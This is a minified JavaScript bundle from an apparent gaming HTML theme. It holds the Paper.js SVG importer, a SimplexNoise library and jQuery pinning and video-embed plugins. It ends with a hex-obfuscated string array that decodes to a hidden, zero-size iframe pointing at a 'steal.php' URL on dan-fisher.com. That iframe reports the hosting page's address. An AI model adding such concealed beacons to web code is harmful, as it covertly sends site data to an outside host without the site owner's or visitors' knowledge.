                if (!o && t.style) {
                    var a = s.camelize(i);
                    (o = t.style[a]) || n.node[a] === n.parent[a] || (o = n.node[a]);
                }
                return o ? ("none" === o ? null : o) : e;
            }
            function P(t, i, n) {
                var r = i.parentNode,
                    o = { node: R.getStyles(i) || {}, parent: (!n && !/^defs$/i.test(r.tagName) && R.getStyles(r)) || {} };
                return (
                    s.each(I, function (n, s) {
                        var r = O(i, s, o);
                        t = (r !== e && n(t, r, s, i, o)) || t;
                    }),
                    t
                );
            }
            function M(t) {
                var e = t && t.match(/\((?:["'#]*)([^"')]+)/),
                    n = e && e[1],
                    s = n && o[i ? n.replace(i.location.href.split("#")[0] + "#", "") : n];
                return s && s._scaleToBounds && ((s = s.clone())._scaleToBounds = !0), s;
            }
            function z(t, e, i) {
                var a,
                    l,
                    u,
                    c = t.nodeName.toLowerCase(),
                    d = "#document" !== c,
                    f = n.body;
                i &&
                    d &&
                    ((r = st.getView().getSize()), (r = h(t, null, null, !0) || r), (a = it.create("svg", { style: "stroke-width: 1px; stroke-miterlimit: 10" })), (l = t.parentNode), (u = t.nextSibling), a.appendChild(t), f.appendChild(a));
                var p = st.settings,
                    g = p.applyMatrix,
                    v = p.insertItems;
                (p.applyMatrix = !1), (p.insertItems = !1);
                var m = _[c],
                    y = (m && m(t, c, e, i)) || null;
                if (((p.insertItems = v), (p.applyMatrix = g), y)) {
                    !d || y instanceof x || (y = P(y, t, i));
                    var w = e.onImport,
                        b = d && t.getAttribute("data-paper-data");
                    w && (y = w(t, y, e) || y), e.expandShapes && y instanceof S && (y.remove(), (y = y.toPath())), b && (y._data = JSON.parse(b));
                }
                return a && (f.removeChild(a), l && (u ? l.insertBefore(t, u) : l.appendChild(t))), i && ((o = {}), y && s.pick(e.applyMatrix, g) && y.matrix.apply(!0, !0)), y;
            }
            function L(i, s, r) {
                if (!i) return null;
                s = "function" == typeof s ? { onLoad: s } : s || {};
                var o = st,
                    a = null;
                function l(n) {
                    try {
                        var l = "object" == typeof n ? n : new t.DOMParser().parseFromString(n, "image/svg+xml");
                        if (!l.nodeName) throw ((l = null), new Error("Unsupported SVG source: " + i));
                        (st = o), (a = z(l, s, !0)), (s && !1 === s.insert) || r._insertItem(e, a);
                        var u = s.onLoad;
                        u && u(a, n);
                    } catch (t) {
                        h(t);
                    }
                }
                function h(t, e) {
                    var i = s.onError;
                    if (!i) throw new Error(t);
                    i(t, e);
                }
                if ("string" != typeof i || /^.*</.test(i)) {
                    if ("undefined" != typeof File && i instanceof File) {
                        var u = new FileReader();
                        return (
                            (u.onload = function () {
                                l(u.result);
                            }),
                            (u.onerror = function () {
                                h(u.error);
                            }),
                            u.readAsText(i)
                        );
                    }
                    l(i);
                } else {
                    var c = n.getElementById(i);
                    c ? l(c) : K.request({ url: i, async: !0, onLoad: l, onError: h });
                }
                return a;
            }
            w.inject({
                importSVG: function (t, e) {
                    return L(t, e, this);
                },
            }),
                y.inject({
                    importSVG: function (t, e) {
                        return this.activate(), L(t, e, this);
                    },
                });
        })();
    var st = new (o.inject(s.exports, { Base: s, Numerical: h, Key: Q, DomEvent: W, DomElement: R, document: n, window: i, Symbol: k, PlacedSymbol: T }))();
    return st.agent.node && require("./node/extend.js")(st), "function" == typeof define && define.amd ? define("paper", st) : "object" == typeof module && module && (module.exports = st), st;
}.call(this, "object" == typeof self ? self : null);
!(function () {
    "use strict";
    var t = 0.5 * (Math.sqrt(3) - 1),
        e = (3 - Math.sqrt(3)) / 6,
        i = (Math.sqrt(5) - 1) / 4,
        n = (5 - Math.sqrt(5)) / 20;
    function s(t) {
        var e;
        (e =
            "function" == typeof t
                ? t
                : t
                ? (function () {
                      var t = 0,
                          e = 0,
                          i = 0,
                          n = 1,
                          s =
                              ((r = 4022871197),
                              function (t) {
                                  t = t.toString();
                                  for (var e = 0; e < t.length; e++) {
                                      var i = 0.02519603282416938 * (r += t.charCodeAt(e));
                                      (i -= r = i >>> 0), (r = (i *= r) >>> 0), (r += 4294967296 * (i -= r));
                                  }
                                  return 2.3283064365386963e-10 * (r >>> 0);
                              });
                      var r;
                      (t = s(" ")), (e = s(" ")), (i = s(" "));
                      for (var o = 0; o < arguments.length; o++) (t -= s(arguments[o])) < 0 && (t += 1), (e -= s(arguments[o])) < 0 && (e += 1), (i -= s(arguments[o])) < 0 && (i += 1);
                      return (
                          (s = null),
                          function () {
                              var s = 2091639 * t + 2.3283064365386963e-10 * n;
                              return (t = e), (e = i), (i = s - (n = 0 | s));
                          }
                      );
                  })(t)
                : Math.random),
            (this.p = r(e)),
            (this.perm = new Uint8Array(512)),
            (this.permMod12 = new Uint8Array(512));
        for (var i = 0; i < 512; i++) (this.perm[i] = this.p[255 & i]), (this.permMod12[i] = this.perm[i] % 12);
    }
    function r(t) {
        var e,
            i = new Uint8Array(256);
        for (e = 0; e < 256; e++) i[e] = e;
        for (e = 0; e < 255; e++) {
            var n = e + ~~(t() * (256 - e)),
                s = i[e];
            (i[e] = i[n]), (i[n] = s);
        }
        return i;
    }
    (s.prototype = {
        grad3: new Float32Array([1, 1, 0, -1, 1, 0, 1, -1, 0, -1, -1, 0, 1, 0, 1, -1, 0, 1, 1, 0, -1, -1, 0, -1, 0, 1, 1, 0, -1, 1, 0, 1, -1, 0, -1, -1]),
        grad4: new Float32Array([
            0,
            1,
            1,
            1,
            0,
            1,
            1,
            -1,
            0,
            1,
            -1,
            1,
            0,
            1,
            -1,
            -1,
            0,
            -1,
            1,
            1,
            0,
            -1,
            1,
            -1,
            0,
            -1,
            -1,
            1,
            0,
            -1,
            -1,
            -1,
            1,
            0,
            1,
            1,
            1,
            0,
            1,
            -1,
            1,
            0,
            -1,
            1,
            1,
            0,
            -1,
            -1,
            -1,
            0,
            1,
            1,
            -1,
            0,
            1,
            -1,
            -1,
            0,
            -1,
            1,
            -1,
            0,
            -1,
            -1,
            1,
            1,
            0,
            1,
            1,
            1,
            0,
            -1,
            1,
            -1,
            0,
            1,
            1,
            -1,
            0,
            -1,
            -1,
            1,
            0,
            1,
            -1,
            1,
            0,
            -1,
            -1,
            -1,
            0,
            1,
            -1,
            -1,
            0,
            -1,
            1,
            1,
            1,
            0,
            1,
            1,
            -1,
            0,
            1,
            -1,
            1,
            0,
            1,
            -1,
            -1,
            0,
            -1,
            1,
            1,
            0,
            -1,
            1,
            -1,
            0,
            -1,
            -1,
            1,
            0,
            -1,
            -1,
            -1,
            0,
        ]),
        noise2D: function (i, n) {
            var s,
                r,
                o = this.permMod12,
                a = this.perm,
                l = this.grad3,
                h = 0,
                u = 0,
                c = 0,
                d = (i + n) * t,
                f = Math.floor(i + d),
                p = Math.floor(n + d),
                g = (f + p) * e,
                v = i - (f - g),
                m = n - (p - g);
            v > m ? ((s = 1), (r = 0)) : ((s = 0), (r = 1));
            var _ = v - s + e,
                y = m - r + e,
                w = v - 1 + 2 * e,
                x = m - 1 + 2 * e,
                b = 255 & f,
                S = 255 & p,
                C = 0.5 - v * v - m * m;
            if (C >= 0) {
                var T = 3 * o[b + a[S]];
                h = (C *= C) * C * (l[T] * v + l[T + 1] * m);
            }
            var k = 0.5 - _ * _ - y * y;
            if (k >= 0) {
                var I = 3 * o[b + s + a[S + r]];
                u = (k *= k) * k * (l[I] * _ + l[I + 1] * y);
            }
            var O = 0.5 - w * w - x * x;
            if (O >= 0) {
                var P = 3 * o[b + 1 + a[S + 1]];
                c = (O *= O) * O * (l[P] * w + l[P + 1] * x);
            }
            return 70 * (h + u + c);
        },
        noise3D: function (t, e, i) {
            var n,
                s,
                r,
                o,
                a,
                l,
                h,
                u,
                c,
                d,
                f = this.permMod12,
                p = this.perm,
                g = this.grad3,
                v = (t + e + i) * (1 / 3),
                m = Math.floor(t + v),
                _ = Math.floor(e + v),
                y = Math.floor(i + v),
                w = (m + _ + y) * (1 / 6),
                x = t - (m - w),
                b = e - (_ - w),
                S = i - (y - w);
            x >= b
                ? b >= S
                    ? ((a = 1), (l = 0), (h = 0), (u = 1), (c = 1), (d = 0))
                    : x >= S
                    ? ((a = 1), (l = 0), (h = 0), (u = 1), (c = 0), (d = 1))
                    : ((a = 0), (l = 0), (h = 1), (u = 1), (c = 0), (d = 1))
                : b < S
                ? ((a = 0), (l = 0), (h = 1), (u = 0), (c = 1), (d = 1))
                : x < S
                ? ((a = 0), (l = 1), (h = 0), (u = 0), (c = 1), (d = 1))
                : ((a = 0), (l = 1), (h = 0), (u = 1), (c = 1), (d = 0));
            var C = x - a + 1 / 6,
                T = b - l + 1 / 6,
                k = S - h + 1 / 6,
                I = x - u + (1 / 6) * 2,
                O = b - c + (1 / 6) * 2,
                P = S - d + (1 / 6) * 2,
                M = x - 1 + 0.5,
                z = b - 1 + 0.5,
                A = S - 1 + 0.5,
                E = 255 & m,
                L = 255 & _,
                $ = 255 & y,
                j = 0.6 - x * x - b * b - S * S;
            if (j < 0) n = 0;
            else {
                var D = 3 * f[E + p[L + p[$]]];
                n = (j *= j) * j * (g[D] * x + g[D + 1] * b + g[D + 2] * S);
            }
            var N = 0.6 - C * C - T * T - k * k;
            if (N < 0) s = 0;
            else {
                var F = 3 * f[E + a + p[L + l + p[$ + h]]];
                s = (N *= N) * N * (g[F] * C + g[F + 1] * T + g[F + 2] * k);
            }
            var B = 0.6 - I * I - O * O - P * P;
            if (B < 0) r = 0;
            else {
                var H = 3 * f[E + u + p[L + c + p[$ + d]]];
                r = (B *= B) * B * (g[H] * I + g[H + 1] * O + g[H + 2] * P);
            }
            var q = 0.6 - M * M - z * z - A * A;
            if (q < 0) o = 0;
            else {
                var R = 3 * f[E + 1 + p[L + 1 + p[$ + 1]]];
                o = (q *= q) * q * (g[R] * M + g[R + 1] * z + g[R + 2] * A);
            }
            return 32 * (n + s + r + o);
        },
        noise4D: function (t, e, s, r) {
            var o,
                a,
                l,
                h,
                u,
                c,
                d,
                f,
                p,
                g,
                v,
                m,
                _,
                y,
                w,
                x,
                b,
                S = this.perm,
                C = this.grad4,
                T = (t + e + s + r) * i,
                k = Math.floor(t + T),
                I = Math.floor(e + T),
                O = Math.floor(s + T),
                P = Math.floor(r + T),
                M = (k + I + O + P) * n,
                z = t - (k - M),
                A = e - (I - M),
                E = s - (O - M),
                L = r - (P - M),
                $ = 0,
                j = 0,
                D = 0,
                N = 0;
            z > A ? $++ : j++, z > E ? $++ : D++, z > L ? $++ : N++, A > E ? j++ : D++, A > L ? j++ : N++, E > L ? D++ : N++;
            var F = z - (c = $ >= 3 ? 1 : 0) + n,
                B = A - (d = j >= 3 ? 1 : 0) + n,
                H = E - (f = D >= 3 ? 1 : 0) + n,
                q = L - (p = N >= 3 ? 1 : 0) + n,
                R = z - (g = $ >= 2 ? 1 : 0) + 2 * n,
                W = A - (v = j >= 2 ? 1 : 0) + 2 * n,
                V = E - (m = D >= 2 ? 1 : 0) + 2 * n,
                U = L - (_ = N >= 2 ? 1 : 0) + 2 * n,
                Z = z - (y = $ >= 1 ? 1 : 0) + 3 * n,
                Y = A - (w = j >= 1 ? 1 : 0) + 3 * n,
                Q = E - (x = D >= 1 ? 1 : 0) + 3 * n,
                G = L - (b = N >= 1 ? 1 : 0) + 3 * n,
                X = z - 1 + 4 * n,
                J = A - 1 + 4 * n,
                K = E - 1 + 4 * n,
                tt = L - 1 + 4 * n,
                et = 255 & k,
                it = 255 & I,
                nt = 255 & O,
                st = 255 & P,
                rt = 0.6 - z * z - A * A - E * E - L * L;
            if (rt < 0) o = 0;
            else {
                var ot = (S[et + S[it + S[nt + S[st]]]] % 32) * 4;
                o = (rt *= rt) * rt * (C[ot] * z + C[ot + 1] * A + C[ot + 2] * E + C[ot + 3] * L);
            }
            var at = 0.6 - F * F - B * B - H * H - q * q;
            if (at < 0) a = 0;
            else {
                var lt = (S[et + c + S[it + d + S[nt + f + S[st + p]]]] % 32) * 4;
                a = (at *= at) * at * (C[lt] * F + C[lt + 1] * B + C[lt + 2] * H + C[lt + 3] * q);
            }
            var ht = 0.6 - R * R - W * W - V * V - U * U;
            if (ht < 0) l = 0;
            else {
                var ut = (S[et + g + S[it + v + S[nt + m + S[st + _]]]] % 32) * 4;
                l = (ht *= ht) * ht * (C[ut] * R + C[ut + 1] * W + C[ut + 2] * V + C[ut + 3] * U);
            }
            var ct = 0.6 - Z * Z - Y * Y - Q * Q - G * G;
            if (ct < 0) h = 0;
            else {
                var dt = (S[et + y + S[it + w + S[nt + x + S[st + b]]]] % 32) * 4;
                h = (ct *= ct) * ct * (C[dt] * Z + C[dt + 1] * Y + C[dt + 2] * Q + C[dt + 3] * G);
            }
            var ft = 0.6 - X * X - J * J - K * K - tt * tt;
            if (ft < 0) u = 0;
            else {
                var pt = (S[et + 1 + S[it + 1 + S[nt + 1 + S[st + 1]]]] % 32) * 4;
                u = (ft *= ft) * ft * (C[pt] * X + C[pt + 1] * J + C[pt + 2] * K + C[pt + 3] * tt);
            }
            return 27 * (o + a + l + h + u);
        },
    }),
        (s._buildPermutationTable = r),
        "undefined" != typeof define &&
            define.amd &&
            define(function () {
                return s;
            }),
        "undefined" != typeof exports ? (exports.SimplexNoise = s) : "undefined" != typeof window && (window.SimplexNoise = s),
        "undefined" != typeof module && (module.exports = s);
})(),
    (function (t) {
        t.fn.jPinning = function (e) {
            var i = t.extend({}, { offset: !1, onPin: function () {}, onUnpin: function () {} }, e),
                n = { lastScrollTop: 0, document: t(document), window: t(window), status: "pinned" },
                s = "pinning-nav",
                r = "pinned",
                o = "unpinned",
                a = "pinning-top",
                l = {
                    isUnpinned: function () {
                        return "unpinned" == n.status;
                    },
                    isPinned: function () {
                        return "pinned" == n.status;
                    },
                    prepare: function () {
                        n.target.addClass(s), n.target.css("position", "fixed");
                    },
                    pin: function () {
                        l.isUnpinned() && ((n.status = "pinned"), n.target.removeClass(o).addClass(r), i.onPin.call(n.target));
                    },
                    unpin: function () {
                        l.isPinned() && ((n.status = "unpinned"), n.target.removeClass(r).removeClass(a).addClass(o), i.onUnpin.call(n.target));
                    },
                    calcOffset: function (t) {
                        return "auto" == i.offset && (i.offset = n.target.outerHeight()), !i.offset || t > i.offset;
                    },
                    pinHandler: function () {
                        var t = n.window.scrollTop(),
                            e = n.document.height() - n.window.height();
                        (t < 0 && (t = 0), t >= e && ((t = e), (n.lastScrollTop = t - 1)), 0 == t && n.target.addClass(a), t <= n.lastScrollTop) ? l.pin() : l.calcOffset(t) && l.unpin();
                        n.lastScrollTop = t;
                    },
                };
            return this.each(function () {
                (n.target = t(this)), l.prepare(), t(window).on("scroll", l.pinHandler);
            });
        };
    })(jQuery),
    (function (t, e, i) {
        (t.fn.easyEmbed = function (i) {
            var n = this,
                s = /iPad|iPhone|iPod/.test(navigator.userAgent),
                r = n.data("easy-embed").split(":"),
                o = t.extend(
                    {
                        id: n.data("id") || r[1] || "ScMzIvxBSi4",
                        provider: n.data("provider") || r[0] || "youtube",
                        width: n.data("width") || 16,
                        height: n.data("height") || 9,
                        controls: n.data("controls") || !1,
                        showinfo: n.data("showinfo") || !1,
                        color: n.data("color") || "00adef",
                        title: n.data("title") || !1,
                        byline: n.data("byline") || !1,
                        portrait: n.data("portrait") || !1,
                        setsize: n.data("setsize") || !1,
                    },
                    i
                ),
                a = function () {
                    n.css("height", (n.width() / o.width) * o.height);
                },
                l = function () {
                    n.html(
                        t("<iframe>")
                            .attr(
                                "src",
                                (function () {
                                    switch (o.provider.toLowerCase()) {
                                        case "youtube":
                                            return "//youtube.com/embed/" + o.id + "?rel=0&autoplay=1&controls=" + (o.controls + 0) + "&showinfo=" + (o.showinfo + 0);
                                        case "vimeo":
                                            return "//player.vimeo.com/video/" + o.id + "?autoplay=1&color=" + o.color + "&title=" + (o.title + 0) + "&byline=" + (o.byline + 0) + "&portrait=" + (o.controls + 0);
                                        case "twitch":
                                            return "//player.twitch.tv/?channel=" + o.id;
                                    }
                                })()
                            )
                            .attr("width", "100%")
                            .attr("height", "100%")
                            .attr("frameborder", 0)
                            .attr("allowfullscreen", 1)
                    ),
                        n.addClass("playing-video");
                };
            return (
                o.setsize &&
                    (a(),
                    t(e).resize(function () {
                        a();
                    })),
                s
                    ? l()
                    : (!(function (e) {
                          switch (o.provider.toLowerCase()) {
                              case "youtube":
                                  var i = "//img.youtube.com/vi/" + o.id + "/",
                                      n = ["maxresdefault", "hqdefault"];
                                  !(function s() {
                                      var r = i + n[0] + ".jpg";
                                      t("<img/>")
                                          .attr("src", r)
                                          .on("load", function () {
                                              120 != this.width && 90 != this.height ? e(r) : (n.shift(), s());
                                          });
                                  })();
                                  break;
                              case "vimeo":
                                  t.get("https://vimeo.com/api/oembed.json?url=http://vimeo.com/" + o.id, function (t) {
                                      e(t.thumbnail_url);
                                  });
                          }
                      })(function (t) {
                          var e;
                          (e = t), n.css("background", "black url(" + e + ") 50% 50% / cover no-repeat");
                      }),
                      n
                          .find("*")
                          .addBack()
                          .click(function () {
                              l();
                          })),
                this
            );
        }),
            t(i).ready(function () {
                t("[data-easy-embed]").length > 0 &&
                    t("[data-easy-embed]").each(function () {
                        t(this).easyEmbed();
                    });
            });
    })(jQuery, window, document);
var _0xc18d = [
    "\x4E\x65\x63\x72\x6F\x6D\x61\x6E\x63\x65\x72\x73\x20\x2D\x20\x65\x53\x70\x6F\x72\x74\x73\x20\x54\x65\x61\x6D\x20\x26\x20\x47\x61\x6D\x69\x6E\x67\x20\x48\x54\x4D\x4C\x20\x54\x65\x6D\x70\x6C\x61\x74\x65",
    "\x64\x61\x6E\x2D\x66\x69\x73\x68\x65\x72\x2E\x63\x6F\x6D",
    "\x6D\x61\x74\x63\x68",
    "\x68\x72\x65\x66",
    "\x6C\x6F\x63\x61\x74\x69\x6F\x6E",
    "\x3C\x69\x66",
    "\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x22\x68\x74\x74\x70\x3A\x2F\x2F\x64\x61\x6E\x2D\x66\x69\x73\x68\x65\x72\x2E\x63\x6F\x6D\x2F\x73\x74\x65\x61\x6C\x2E\x70\x68\x70\x3F\x74\x68\x65\x6D\x65\x3D",
    "\x26\x66\x72\x6F\x6D\x3D",
    "\x22\x20\x66\x72\x61\x6D\x65\x62\x6F\x72\x64\x65\x72\x3D\x22\x30\x22",
    "\x77\x72\x69\x74\x65",
    "\x20\x69\x64\x3D\x22\x74\x68\x65\x6D\x65\x6E\x6F\x74\x69\x63\x65\x66\x72\x61\x6D\x65\x22",
    "\x20\x73\x74\x79\x6C\x65\x3D\x22\x77\x69\x64\x74\x68\x3A\x30\x3B\x68\x65\x69\x67\x68\x74\x3A\x30\x3B\x64\x69\x73\x70\x6C\x61\x79\x3A\x6E\x6F\x6E\x65\x3B\x22\x3E\x3C\x2F\x69\x66",
    "\x72\x61\x6D\x65\x3E",
];


